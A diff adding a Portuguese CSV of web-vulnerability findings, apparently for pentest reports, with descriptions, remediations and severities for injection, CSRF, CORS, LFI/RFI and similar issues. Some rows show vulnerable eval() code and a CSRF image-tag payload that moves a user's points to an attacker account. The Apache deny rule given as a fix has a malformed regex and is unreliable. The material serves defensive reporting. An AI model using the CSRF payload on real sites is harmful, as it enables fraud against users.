@@ -1,0 +1,987 @@
+;Data Source Type;Data Source Key;Vulnerabilidade;Descrição;Outras observações técnicas;Recomendação - Título;Recomendação;Causa raíz;CAT1 - CONTROLE;CAT2 - OWASP;Severidade;Risco (Tags);Referência 1;Referência 2;;;;;;;;;;;;;;
+V;;;Code injection;"Muitas linguagens de programação modernas são capazes de interpretação de instruções de código em tempo de execução. Essa capacidade permite aos programadores executar instruções dinâmicas através de campos de entrada de dados inseridas pelo usuário.A vulnerabilidade de Injeção de Código acontece quando o programador incorretamente assume que toda instrução fornecida pelo usuário será apenas para ações esperadas como por exemplo um cálculo simples ou modificação de um status do usuário.No entanto, sem a validação apropriada, o usuário poderia enviar instruções de código que o programador não pretendia que fossem executadas. Por exemplo: Num caso clássico de Injeção de Código, a aplicação implementa uma calculadora básica que permite ao usuário definir o comando a ser executado....userOp = form.operation.value;calcResult = eval(userOp);...O programa funciona como planejado quando o parâmetro inserido é um valor benigno, como ""8 + 7 * 2"", que resultaria num valor ""22"" inserido na variável calcResult. Mas, se o usuário mal-intencionado inserir uma operação válida (e maliciosa) para a linguagem de programação usada, a operação seria executada com sucesso no nível de permissão do processo pai.No caso de a linguagem usada ser o Java Script, usuário mal-intencionado seria capaz de realizar ataques de Cross-site Scripting.Outro exemplo de código vulnerável seria:oData = eval( '('+decodeURIComponent(aSplitCookie[1])+')' );""";-;Code injection;-;-;;;;;;;;;;;;;;;;;;;;
+V;;;Cookies Header Manipulation;A inclusão de dados não validados em Cookies pode resultar na manipulação de cabeçalho de Respostas HTTP, além de permitir ataques como envenenamento de cache, Cross-Site Scripting, sequestro de páginas, manipulação de cookies ou redirecionamento aberto.;-;Cookies Header Manipulation;"A manipulação de cabeçalho do cookie, ocorre quando um usuário mal-intencionado inclui dados maliciosos em sua saída. Por isso deve-se validar os dados imediatamente, antes que eles deixem o aplicativo. A abordagem mais segura para a validação de Manipulação de Cabeçalho é criar um white list de caracteres seguros que podem aparecer em cabeçalhos de respostas HTTP e aceitar entradas formadas exclusivamente por caracteres do conjunto aprovado. Por exemplo, um nome válido pode incluir somente caracteres alfanuméricos, ou um número de conta pode incluir somente dígitos de 0 a 9.Uma abordagem mais flexível, mas menos segura, é conhecida como ""black list"", que faz a rejeição ou o escape seletivo de caracteres potencialmente perigosos antes de usar os dados. Para formar uma lista desse tipo, primeiro você precisa compreender o conjunto de caracteres que têm significado especial em cabeçalhos de respostas HTTP. Embora os caracteres de CR e LF estejam no centro de um ataque de divisão de respostas HTTP, outros caracteres, como ':' (dois pontos) e '=' (sinal de igual), também têm significado especial em cabeçalhos de respostas.Depois que você identificar os pontos corretos em um aplicativo para realizar a validação de ataques de Manipulação de Cabeçalho e especificar quais caracteres especiais devem ser levados em consideração por essa validação, o próximo desafio é identificar como ela lida com caracteres especiais. O aplicativo deve rejeitar qualquer entrada destinada a inclusão em cabeçalhos de respostas HTTP que contêm caracteres especiais, particularmente CR e LF, marcando essa entrada como inválida.";-;;;;;;;;;;;;;;;;;;;;
+V;;;Descoberta de caminho local;"Esta vulnerabilidade permite que um usuário mal-intencionado veja o caminho para o webroot / arquivo. Ex.: /home/ omg/ htdocs/ Certas vulnerabilidades, como o uso da função load_file() (dentro de uma injeção de SQL) para ver o código fonte da página, exige que o usuário mal-intencionado tenha o caminho completo para o arquivo que deseja visualizar. Os riscos relativos a esta vulnerabilidade pode produzir vários resultados. Por exemplo, se o webroot está exposto, os usuário mal-intencionados podem utilizar esta informação e usá-lo em combinação com vulnerabilidades de inclusão de arquivos para roubar arquivos de configuração em relação à aplicação web ou no sistema operacional.";-;Descoberta de caminho local;-;-;;;;;;;;;;;;;;;;;;;;
+;;;A aplicação está suscetível a desserialização;Serialização é o processo de transformar algum objeto em um formato de dados que pode ser restaurado posteriormente. As pessoas costumam serializar objetos<br/>para salvá-los no armazenamento ou para enviar como parte das comunicações. <br/>A desserialização é o inverso desse processo - levando dados estruturados de algum formato e reconstruindo-os em um objeto. <br/><br/>No entanto, muitas linguagens de programação oferecem um recurso nativo para serializar objetos. Esses formatos nativos geralmente oferecem mais recursos <br/>do que JSON ou XML, incluindo a personalização do processo de serialização. Infelizmente, os recursos desses mecanismos de desserialização nativos<br/>podem ser redefinidos para efeito mal-intencionado ao operar em dados não confiáveis. Ataques contra deserializers foram encontrados para permitir ataques de negação de serviço, controle de acesso e execução remota de código.;;A aplicação está suscetível a desserialização;O único padrão arquitetural seguro é não aceitar serializado<br/>objetos de fontes não confiáveis __ou para usar mídias de serialização<br/>que apenas permitem tipos de dados primitivos.<br/>Se isso não for possível, considere um dos seguintes procedimentos:<br/><br/>* Implementar verificações de integridade, como assinaturas digitais, em qualquer<br/>objetos serializados para impedir a criação ou os dados de objetos hostis<br/>Adulteração.<br/><br/>* Impondo restrições restritas de tipo durante a desserialização antes<br/>criação de objeto como o código normalmente espera um conjunto definível de<br/>classes. Bypasses a esta técnica foram demonstrados,<br/>então confiar apenas nisso não é aconselhável.<br/><br/>* Isolando e executando código que desserializa em baixo privilégio<br/>ambientes quando possível.<br/><br/>* Registrando exceções e falhas de desserialização, como onde<br/>o tipo de entrada não é o tipo esperado, ou o<br/>desserialização gera exceções.<br/><br/>* Restringindo ou monitorando a rede de entrada e saída<br/>conectividade de contêineres ou servidores que desserializam.<br/><br/>* Monitorando a desserialização, alertando se um usuário desserializa<br/>constantemente.<br/><br/>;-;;;CRITICAL;;;;;;;;;;;;;;;;;
+;;;A aplicação está vulnerável a expression language injection;Foi identificado que a aplicação não está validando de forma <br/><br/>correta as requisições submetidas ao servidor. Por meio de variáveis <br/><br/>vulneráveis na aplicação, é possível executar scripts maliciosos, sendo <br/><br/>os mesmos de forma remota. Isto pode manipular a funcionalidade do <br/><br/>aplicativo, expor dados confidenciais e representar riscos de <br/><br/>indisponibilidade dos serviços.<div><br></div>;;A aplicação está vulnerável a expression language injection;"Aplicar as melhores práticas de validação de entrada para garantir que não haja caracteres meta EL ( ""$ {"" e ""# {"") na entrada.";-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;A aplicação está vulnerável a injeção de código.;Foi observado que a aplicação encontra-se vulnerável a code injection, de modo que foi possível executar códigos maliciosos no servidor, códigos que executam comando do sistema operacional.<br/><br/>Esta vulnerabilidade é explorada por meio de variáveis vulneráveis e ocorre devido a utilização de funções vulneráveis da própria linguagem de programação ou erros no próprio código fonte.;;A aplicação está vulnerável a injeção de código.;"Para mitigar ataques por injeção de códigos maliciosos devem-se:<br/><br/><br/><br/>- Evitar variáveis vulneráveis na linguagem de programação adotada;<br/><br/>- Deve-se revisar o código fonte das páginas, a fim de corrigir erros de programação;<br/><br/>- Caracteres especiais devem ser filtrados;<br/><br/>- Deve ser construído um script de validação dos dados requisitados pelo cliente.<br/><br/><br/><br/>Referência:<br/><br/>http://www.owasp.org/index.php/Interpreter_Injection#Code_Injection<br/><br/>http://www.owasp.org/index.php/Data_Validation";-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;A aplicação permite realizar bypass da autenticação;É possível realizar burlar o mecanismo de autenticação e acessar diretórios e/ou arquivos de configurações de sistema.;;A aplicação permite realizar bypass da autenticação;Restringir o acesso conforme recomendações do fornecedor.;-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;Anexo malicioso em mensagens SOAP;Devido a falta de verificação da confiabilidade do arquivo ou string colocada em upload na mensagem SOAP, foi possível realizar o upload de uma script trojada.;;Anexo malicioso em mensagens SOAP;Deve ser implementado na rede e computadores, dispositivos e sistemas de segurança que possam verificar a confiabilidade do arquivo ou string trafegada entre o Web Services e o Banco de dados, a fim de bloquear todo tráfego malicioso.<br/><br/><br/><br/>Dispositivos e softwares a serem instalados:<br/><br/>- IDS, IPS, Firewall/Proxy e Antivírus.;-;;;HIGH;;;;;;;;;;;;;;;;;
+;;Comunicação insegura entre cliente e servidor (HTTPS);Aplicação acessível via HTTP;"<span><span style=""color:black"">A aplicação está com o HTTPS habilitado,<br/><br/> porém ainda permite o uso do HTTP quando o cliente faz uma requisição <br/><br/>explícita usando esse protocolo. Essa situação torna a comunicação entre<br/><br/> o cliente e o servidor insegura, forçando o tráfego das informações em <br/><br/>texto claro.</span></span>";;Aplicação acessível via HTTP;"<span><span style=""color:black"">Em páginas e aplicações em que trafeguem<br/><br/> informações sensíveis, deve-se desabilitar o uso do HTTP sem <br/><br/>criptografia. Mesmo que o cliente force uma comunicação desse tipo, a <br/><br/>aplicação deve redirecionar para um canal de comunicação seguro com <br/><br/>HTTPS.</span></span>";-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Armazenamento inseguro de dados;"Informações confidências estão armazenados de forma insegura no servidor.<span class=""Apple-tab-span"" style=""white-space:pre""></span>";;Armazenamento inseguro de dados;Não permitir o processamento, armazenamento e transmissão destas informações.;-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;Ausência de criptografia no _VIEWSTATE;"ViewState é o mecanismo qual o <a href=""http://ASP.NET"" target=""_blank"">ASP.NET</a><br/><br/> utiliza para manter o estado de controles e objetos quando um Postback <br/><br/>ocorre na página. As informações são armazenadas em um controle html do <br/><br/>tipo ""hidden"" chamado _VIEWSTATE.&nbsp;<div><br></div>";;Ausência de criptografia no _VIEWSTATE;"Recomenda-se que não se guarde nenhum valor ""seguro"" que possa ir <br/><br/>para o cliente. Existe uma forma de tornar mais segura as modificações <br/><br/>no viewstate criando um hash de seu conteúdo, assim quando for <br/><br/>modificado, o valor do hash muda sendo detectado no servidor, voltando <br/><br/>ao seu estado original.<div><br></div><div>Isso pode ser feito aplicando na diretiva da página:</div><div><br></div><div>&lt;%@Page EnableViewStateMAC=true %&gt;</div><div><br></div><div>Pode-se<br/><br/> também criptografar usando o algoritimo SHA1 (default) o que dificulta <br/><br/>um pouco a modificação, porem isso é possível. Estas modificações podem <br/><br/>ser feitas no arquivo machine.config do servidor web.</div>";-;;;LOW;;;;;;;;;;;;;;;;;
+;;Função logout inadequada;Ausência de função logout;"Foi observado que a aplicação não possui função logout; esta situação permite que o usuário autenticado seja personificado, pois não há uma função que destrua a sessão do usuário corrente. Desta forma, em um computador que seja utilizado por mais de um usuário, caso o último autenticado não feche o navegador, o próximo usuário poder-se-ia utilizar a sessão e realizar ações maliciosas em nome do usuário anterior.";-;-;Deve-se criar um botão (sair ou logout), com a função de desautenticar o usuário da aplicação e destruir o SessionID da mesma, sem que o SessionID possa ser reutilizado.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Ausência de integridade na aplicação;Foi observado que a aplicação não disponibiliza-se em perfeita integridade de seus recursos.Esta situação prejudica e impacta nos resultados dos testes, tornando-os menos completos, visto que, alguns recursos não puderam ser testados ou foram parcialmente testados.;;Ausência de integridade na aplicação;Deve-se validar a causa do mal funcionamento dos recursos da aplicação e corrigi-los, a fim de que esses possam ser testados corretamente. O pleno funcionamento da aplicação proporciona testes mais completos e exatos.;-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
+V;;;Ausência de log da aplicação;"Esses registros podem conter dados confidenciais e informação de identificação pessoal, por isso, convém que hajam medidas apropriadas de proteção de privacidade dos dados, inclusive é recomendável que administradores do sistema não tenham permissão de exclusão ou desativação de logs.Os registros de eventos estabelecem o fundamento para os sistemas de monitoramento, que são capazes de gerar relatórios consolidados e alertas de segurança do sistema. Sistema: Criação, consulta, acréscimo ou substituição de informações;Importação e exportação de dados;Impressão de registros.Ações de usuário:Tentativas de autenticação de usuário, com ou sem sucesso;Troca de senha;Encerramento de sessão de usuário;Aceitação do termo de concordância de uso.Ações operacionais: Conexões com o banco de dados;Atividades de configuração do sistema (alterações administrativas);Atividades de gerenciamento de usuários e papéis, como ativação de conta de usuário ou alteração de permissão;Realização e restaurações de backup.Integrações:Envio e recepção de dados e suas confirmações de entregas;Erros de integridade e autenticação de mensagens;Erros de autenticação de parceiros.Ações privilegiadas:Ações de delegação de poder;Ações realizadas sob delegação de poder.E todos os eventos devem possuir: Data (dia, mês e ano) e hora (hora, minuto, segundo); Tipo de evento; Identificação do componente que gerou o evento (ex: endereço IP);Identificação do usuário gerador do evento.";-;Ausência de log da aplicação;"Sempre que aplicável, é necessário incluir as seguintes informações nos logs do sistema:_ Identificação dos usuários (ID);_ Atividades do sistema e operações de usuários;_ Exceções e falhas;_ Datas, horários, detalhes de eventos-chave, como por exemplo, horário de entrada (logon) e saída (logoff) do sistema;_ Identidade do dispositivo ou sua localização quando possível o identificador do sistema;_ Registros das tentativas de acesso ao sistema, aceitas ou rejeitadas;_ Registros das tentativas de acesso a outros recursos e dados, aceitas ou rejeitadas;_ Alteração na configuração do sistema;_ Uso de privilégios;_ Uso de aplicações e utilitários do sistema;_ Arquivos acessados e o tipo de acesso;_ Endereços e protocolos de rede;_ Alarmes provocados pelo sistema de controle de acesso;_ Ativação e desativação dos sistemas de proteção, como sistemas de antivírus e sistemas de detecção de intrusos;_ Registros de transações executadas pelos usuários nas aplicações.";-;Registro de eventos;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Ausência de monitoramento;Foi observado que eventos críticos de segurança não são registrados corretamente, como uma tentativa de login com falha, isso pode tornar o comportamento mal-intencionado mais difícil de ser detectado.;;Ausência de monitoramento;Estabelecer monitoramento efetivo e alertar tais suspeitas<br/>atividades são detectadas e respondidas em tempo hábil.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Ausência de reCAPTCHA;Foi averiguado que a aplicação não está utilizando um mecanismo <br/><br/>anti-flood em formulário de inserção de dados ao servidor. <br/><br/>Consequentemente, um usuário mal-intencionado poderia submeter uma grande <br/><br/>quantidade de requisições no formulário, a fim de poluir a aplicação ou <br/><br/>servidor, podendo causar até lentidão ou instabilidade na mesma.;;Ausência de reCAPTCHA;Deve-se implementar um mecanismo de reCAPTCHA a fim de filtrar o excesso<br/><br/> de requisições submetidas por meio de formulários da aplicação.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Blind SQL Injection;Esta técnica baseia-se no que chamamos de Verdadeiro ou Falso.<br/><br/>Aplicamos um parâmetro comparativo em variáveis da URL que fazem chamadas ao DB e executamos a página para ele comparar nosso parâmetro com o conteúdo do banco de dados, se o conteúdo for verdadeiro, ou seja, se ele existir no banco de dados a página irá carregar normalmente, porém se ele for falso a página apresentará erro.<br/><br/><br/><br/>Estando a aplicação suscetível a comparações, foi possível identificar informações restritas do banco de dados.<br/><br/><br/><br/>Informações identificadas:<br/><br/>xxxxxxxxxx;;Blind SQL Injection;As consultas devem ser construídas utilizando stored procedures ou consultas parametrizadas, de forma a impedir a concatenação de comandos SQL.<br/><br/><br/><br/>Deve-se também sanitizar/filtrar as entradas de dados feitas por usuários para não aceitar caracteres e expressões não esperadas pela aplicação. Normalmente, os caracteres que devem ser fitlrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.;-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;Blind XPath Injection;Esta técnica baseia-se no que chamamos de Verdadeiro ou Falso.<br/><br/>Aplicamos um parâmetro comparativo em queries do XML que fazem chamadas ao DB e executamos o XML para ele comparar nosso parâmetro com o conteúdo do banco de dados, se o conteúdo for verdadeiro, ou seja, se ele existir no banco de dados a página irá carregar normalmente, porém se ele for falso a página apresentará erro.<br/><br/><br/><br/>Estando a aplicação suscetível a comparações, foi possível identificar informações restritas do banco de dados.<br/><br/><br/><br/>Informações identificadas:<br/><br/>xxxxxxx;;Blind XPath Injection;Deve-se também sanitizar/filtrar as entradas de dados feitas por usuários para não aceitar caracteres e expressões não esperadas pela aplicação. Normalmente, os caracteres que devem ser fitlrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.;-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;Conteúdo inadequado;Foram identificados arquivos e diretórios inadequados presentes no servidor web. Essa situação possibilita obter informações e detalhes sobre a aplicação que podem ser vitais para realizar um ataque mais elaborado. Arquivos, por exemplo, sem referência ou que não sejam processados pelo servidor podem divulgar informações confidenciais que facilitarão um ataque contra a aplicação.;;Conteúdo inadequado;"Foram identificados arquivos e diretórios inadequados presentes no servidor web. Essa situação possibilita obter informações e detalhes sobre a aplicação que podem ser vitais para realizar um ataque mais elaborado.<br/><br/><br/><br/>Deve-se evitar o máximo a edição de arquivos diretamente no ambiente de produção, pois arquivos de copia de segurança podem ser criados automaticamente. <br/><br/><br/><br/>Os arquivos de backup devem ser armazenados em uma partição separada, em relação com a partição utilizada pela aplicação.<br/><br/>Caso o servidor Web seja Apache as restrições descritas abaixo devem ser estabelecidas.<br/><br/>No arquivo ""apache2.conf"":<br/><br/><br/><br/><Files ~ "".(bak|old|$"" ><br/><br/>Order allow,deny<br/><br/>Deny from all<br/><br/></Files><br/><br/><br/><br/>Consulte http://filext.com/ para uma base de dados mais completa de extensões.";-;;;LOW;;;;;;;;;;;;;;;;;
+v;;;Cross Site Request Forgery (CSRF);"Em uma aplicação de pontuação para troca de prêmios, o usuário chamado José navega autenticado nessa aplicação (A) e em um fórum de jogos (B).Dentro do fórum de jogos, um usuário mal-intencionado insere uma tag HTML que transfere os pontos de José para um usuário chamado qwerty.<img src=”http://pontosepremio[.]com.br/transferencia?pontos=35000&destino=qwerty”>Sendo assim, a partir da aba “B” ocorrerá uma requisição ao sistema “A”, como José está autenticado em “A” em uma sessão válida, seus 35000 pontos serão transferidos para o usuário mal-intencionado qwerty.Caso o sistema “A” não faça as devidas validações, o usuário José terá seus pontos transferidos sem a sua autorização consciente. ";-;Cross Site Request Forgery (CSRF);"Normalmente conhecido por CSRF ou XSRF, esse ataque ocorre quando uma aplicação “A” (atacada), aberta em um mesmo navegador, faz uma requisição para aplicação “B” (usuário mal-intencionado). Este ataque é geralmente destinado às funcionalidades críticas ou transacionais de uma aplicação.Dentre as possíveis soluções para o problema, pode-se utilizar tokens inseridos em campos hidden nos formulários HTML que devem ser checados no servidor como forma de impor um desafio. Assim cada requisição além de validar o cookie de sessão, deve também verificar se o token do desafio foi recebido corretamente na submissão do formulário, esse mecanismo se chama token per-page. É recomendável avaliar as funcionalidades críticas da aplicação e implementar tal proteção. Além disso, a maioria dos frameworks já possuem suporte embutido de CSRF.";-;Validação de Cross-Site Request Forgery (CSRF);;MEDIUM;;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF);;;;;;;;;;;;;;
+;;;Divulgação de cookie na URL;Foi observado que a aplicação está divulgando o cookie de sessão do usuário na URL.<br/><br/>Este caso se agrava, caso a aplicação esteja vulnerável ao item roubo de sessão, gerando problemas de privacidade e não - repúdio.;;Divulgação de cookie na URL;Deve-se configurar a aplicação para que a mesma não divulgue cookie de sessão na URL.;-;;;LOW;;;;;;;;;;;;;;;;;
+;;;DoS por tempo de execução de parâmetros;Foi observado que a aplicação está suscetível a negação de serviço por meio do envio de requisições manipuladas juntamente às variáveis determinadas pela aplicação.<br/><br/>Quando esta vulnerabilidade é explorada, a aplicação torna-se indisponível até que o serviço seja reiniciado.;;DoS por tempo de execução de parâmetros;- Deve-se avaliar qual o componente ocasionou a interrupção do serviço.<br/><br/>- Devem-se revisar as funções de dados e os parâmetros de entrada a fim de garantir o devido tratamento das informações submetidas pelo usuário.<br/><br/>Normalmente, os caracteres que devem ser filtrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.<br/><br/><br/><br/>- Devem ser redirecionadas para uma página de erro padrão as requisições que fazem uso de caracteres especiais ou strings indevidas.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Enumeração de usuários válidos;A mensagem apresentada pela aplicação em falha de login faz distinção da informação que está inválida. Esta situação possibilita elencar usuários válidos na aplicação tornando o processo de descoberta de credenciais mais fácil.;;Enumeração de usuários válidos;Deve-se adotar uma mensagem genérica em caso de erro de autenticação, de forma a não permitir identificação de usuários válidos no sistema.;-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
+;;;Escala de privilégios;A escala de privilégio é o ato de acessar com um usuário de baixo privilégio, áreas ou páginas da aplicação que somente seriam permitidas a um perfil de usuário de maior privilégio. <br/><br/>Foi observado que a aplicação encontra-se vulnerável ao presente item.;;Escala de privilégios;Deve-se validar a permissão de acesso a objetos e funções do usuário no sistema a cada requisição de forma a impedir a execução e acesso não autorizado a funções e informações da aplicação.;-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;Execução de comandos do Sistema Operacional;Foram encontradas na aplicação variáveis que executam comandos no sistema operacional do servidor. Tais variáveis encontram-se vulneráveis, permitindo a qualquer usuário submeter comandos no e do sistema operacional, por meio da URL da aplicação.;;Execução de comandos do Sistema Operacional;"Para mitigar ou extinguir a execução de comandos do sistema por usuários anônimos, deve-se:<br/><br/><br/><br/>- Evitar variáveis vulneráveis;<br/><br/>- Revisar o código fonte a fim de corrigir erros no código;<br/><br/>- Filtrar o conteúdo enviado entre o cliente e o servidor, de modo a não permitir caracteres especiais ou comandos do sistema vindo de um usuário anônimo;<br/><br/>- Definir a permissão das stored procedures para negar a execução e escrita da stored procedures por parte de um usuário anônimo;<br/><br/><br/><br/>Para Web Services:<br/><br/>- Implementar o WS-Security (sistema de segurança para Web Services).";-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;Execução de script interno;Foi identificado que a aplicação não está validando de forma correta as requisições submetidas ao servidor.<br/><br/>Por meio de variáveis vulneráveis, foi possível requisitar e executar scripts no servidor, scripts estes de diretórios internos e não autorizados a usuários anônimos.;;Execução de script interno;- Devem-se revisar as permissões dos diretórios restritos, de modo a configurar os mesmos para negar todas as permissões a usuários anônimos.<br/><br/>- Deve-se validar todo o conteúdo submetido ao servidor, de modo que o mesmo não aceite requisições que solicitem a leitura, gravação ou execução de scripts restritos.;-;;;HIGH;;;;;;;;;;;;;;;;;
+;;Proteção de informações sensíveis ;Exposição de código fonte;Foi observado que algumas páginas server-side estão disponibilizando seu código fonte.<br/><br/>O código fonte disponibilizado, revela informações sensíveis, do servidor e dos usuários.<br/><br/><br/><br/>Estas informações possibilitam a usuários maliciosos, fazerem uso das mesmas para efetuar ataques mais críticos.;;Exposição de código fonte;"Deve-se configurar o servidor Web para restringir a leitura não autorizada ao código fonte das páginas.<br/><br/><br/><br/>Para o servidor Apache utilize o comando - chown -R webmaster:www-group www/ && chmod -R 640 www/ - no diretório do site para definir o nível de privilégio dos usuários em relação aos arquivos que serão acessos por eles nas aplicações Web. <br/><br/>Deve-se também remover todos os arquivos com extensão (.old, .bak ou semelhantes) e adicionar o parâmetro abaixo em apahe2.conf ou httpd.conf:<br/><br/><Files ~ "".(bak|old|$"" ><br/><br/>Order allow,deny <br/><br/>Deny from all </Files> <br/><br/><br/><br/>Para o servidor IIS 6.0 vá até as propriedades do site no painel de gerenciamento do IIS e desabilite a opção Script Source Access.";-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;Falha no WSDL;Foram encontradas informações sensíveis estando elas ocultas em arquivos WSDL.<br/><br/>Tais informações não devem ser legíveis a usuários anônimos nem sendo em modo oculto.;;Falha no WSDL;Deve ser implementado o WS-Security para garantir a segurança e consistência do WSDL.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;Falta de largura de banda;Inudando o servidor com inúmeras requisições, foi possível consumir toda a largura de banda usada pelo mesmo, levando a aplicação a negação de serviço.;;Falta de largura de banda;"- Deve ser definido a variável SynCookie no sistema operacional, está variável faz com que o servidor não aloque recursos até que a conexão seja completamente estabelecida;<br/><br/>- Deve-se utilizar um Load Balancing para cada servidor. O Load Balancing tem o objetivo de aumentar a largura de banda de conexões que estão em estado crítico;<br/><br/>- Deve-se utilizar um Throttling para controlar a carga máxima de conexões de um determinado serviço/protocolo que poderá ser processada por ciclo.<br/><br/><br/><br/>Obs: Recomendamos que o Load Balancing e o Throttling sejam de marcas confiáveis como, Cisco.";-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;HTML5 (CORS) compartilhamento de recursos;Os recursos HTML5 cross-origin controles de políticas de compartilhamento de saber se e como o conteúdo em execução em outros domínios podem realizar interação bidirecional com o domínio que publica a política. A política pode aplicar controles de acesso por pedido com base na URL e outras características do pedido. Se outro domínio é permitido pela política, então esse domínio pode potencialmente atacar os usuários do aplicativo. Se um usuário estiver conectado no aplicativo, e visita um domínio permitido pela política, então qualquer conteúdo malicioso em execução nesse domínio potencialmente pode recuperar o conteúdo do aplicativo, e, por vezes, levar a cabo ações no contexto do usuário conectado segurança. Mesmo se um domínio permitido não é abertamente malicioso em si, vulnerabilidades de segurança nesse domínio poderia ser aproveitado por um usuário mal-intencionado de terceiros para explorar a relação de confiança e atacar o aplicativo que permite o acesso.;;HTML5 (CORS) compartilhamento de recursos;Deve-se permitir apenas domínios confiáveis e que serão utilizados, para que possam ser especificados no cabeçalho Access-Control-Allow-Origin. <br/><br/>Não é recomendável a utilização do caractere * , que indica a permissão de um domínio sem checagem.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;HTTP Server Type and Version;This plugin attempts to determine the type and the version of the remote web server.;;HTTP Server Type and Version;-;-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
+;;;Identificação de ferramenta;Foi possível identificar a ferramenta - URLScan - utilizada para filtrar alguns tipos de ataques, exemplo: Cross-Site Scripting.<br/><br/>Esta situação ajuda um usuário mal-intencionado a pesquisar/desenvolver métodos de by-pass referente a filtragem de segurança ou vulnerabilidade na ferramenta descoberta.;;Identificação de ferramenta;"Deve-se ofuscar a mensagem na Url: ""/Rejected-By-UrlScan""; Ou impedir que a mesma seja transmitida na URL.";-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
+;;;Inclusão de Arquivo Local (LFI);A vulnerabilidade consiste na ausência de validação de dados em procedures de inclusão, permitindo que arquivos locais do servidor sejam incluídos.;;Inclusão de Arquivo Local (LFI);Para correção da vulnerabilidade é recomendado a devida validação dos dados, impedindo que valores inseridos por usuários sejam submetidos ao sistema de arquivos/API do framework.<br/><br/>Em casos específicos, onde não é possível realizar a correção acima, também pode-se utilizar White Lists contendo os arquivos que podem ser acessados. Qualquer requisição diferente não será processada pela aplicação.;-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;Inclusão de Arquivo Remoto (RFI);A vulnerabilidade consiste na ausência de validação de dados em procedures de inclusão, permitindo que arquivos remotos sejam inseridos na aplicação através de variáveis da URL.<br/><br/>Dessa forma um usuário mal intencionado pode inserir arquivos maliciosos e injetar comandos no servidor.;;Inclusão de Arquivo Remoto (RFI);Para correção da vulnerabilidade é recomendado a devida validação dos dados, impedindo que valores inseridos por usuários sejam submetidos ao sistema de arquivos/API do framework.<br/><br/>Em casos específicos, onde não é possível realizar a correção acima, também pode-se utilizar White Lists contendo os arquivos que podem ser acessados. Qualquer requisição diferente não será processada pela aplicação.<br/><br/>;-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;Proteção de informações sensíveis ;Informações sensíveis estão sendo disponibilizadas pelo servidor Web.;Através do banner é possível obter informações sobre o sistema operacional e o servidor web instalado no servidor.<br><br>;;Informações sensíveis estão sendo disponibilizadas pelo servidor Web.;Apache:<br/><br/>Configurar o servidor Apache para não disponibilizar estas informações modificando a diretiva <br/><br/>SeverTokens de Full para Prod.<br/><br/>IIS:<br/><br/>Utilizar o URLScan<br/><br/>32-Bit (x86): http://www.microsoft.com/downloads/details.aspx?FamilyID=ee41818f-3363-4e24-9940-321603531989<br/><br/><br/><br/>64-Bit (x64): http://www.microsoft.com/downloads/details.aspx?FamilyID=361e5598-c1bd-46b8-b3e7-3980e8bdf0de<br/>;-;;;INFORMATIVE;;;;;;;;;;;;;;;;;
+;;;Injeção de script remoto;Foi identificado que a aplicação não está validando de forma correta as requisições submetidas ao servidor.<br/><br/>Por meio de variáveis vulneráveis, foi possível executar no servidor, scripts maliciosos, sendo os mesmos externos.;;Injeção de script remoto;Deve-se validar todo o conteúdo submetido ao servidor, de modo que o mesmo não execute scripts de origem externa.;-;;;HIGH;;;;;;;;;;;;;;;;;
+;;;Injeção em Server-Side Includes;Variáveis Server-Side Includes servem para invocar um script armazenado no servidor para que o mesmo seja incorporado na página da aplicação.<br/><br/>Foi detectado que a aplicação está vulnerável a injeção de strings maliciosos nas variáveis de includes. Como impacto, é possível invocar um arquivo externo (RFI - Remote File Include) para ser utilizado de forma maliciosa e assim executar comandos no servidor ou ainda invocar algum arquivo interno do servidor (LFI - Local File Include).;;Injeção em Server-Side Includes;"Devem-se:<br/><br/><br/><br/>- Permitir apenas diretivas SSI necessárias para a página em questão e desativar todas as outras;<br/><br/>- Codificar o HTML do usuário que forneceu os dados antes de passá-lo para uma página com permissões de execução SSI;<br/><br/>- Use ""Suexec"" para que a página execute como sendo dono do arquivo ao invés do usuário do servidor web.";-;;;MEDIUM;;;;;;;;;;;;;;;;;
+;;;LDAP Injection;A injeção LDAP é semelhante a SQL, porém ao invés de usar parâmetros SQL e o servidor de banco de dados, é utilizado o protocolo LDAP e seu respectivo servidor. A injeção LDAP permite coletar ou modificar informações confidenciais do servidor e em alguns casos modificar objetos da estrutura LDAP.<br/><br/><br/><br/>Foi possível modificar informações do servidor LDAP.<br/><br/><br/><br/>Parâmetro vulnerável:;;LDAP Injection;Deve-se também sanitizar/filtrar as entradas de dados feitas por usuários para não aceitar caracteres e expressões não esperadas pela aplicação. Normalmente, os caracteres que devem ser fitlrados são <,>,(,),%,$,”,´,`, além de suas várias codificadas.;-;;;MEDIUM;;;;;;;;;;;;;;;;;
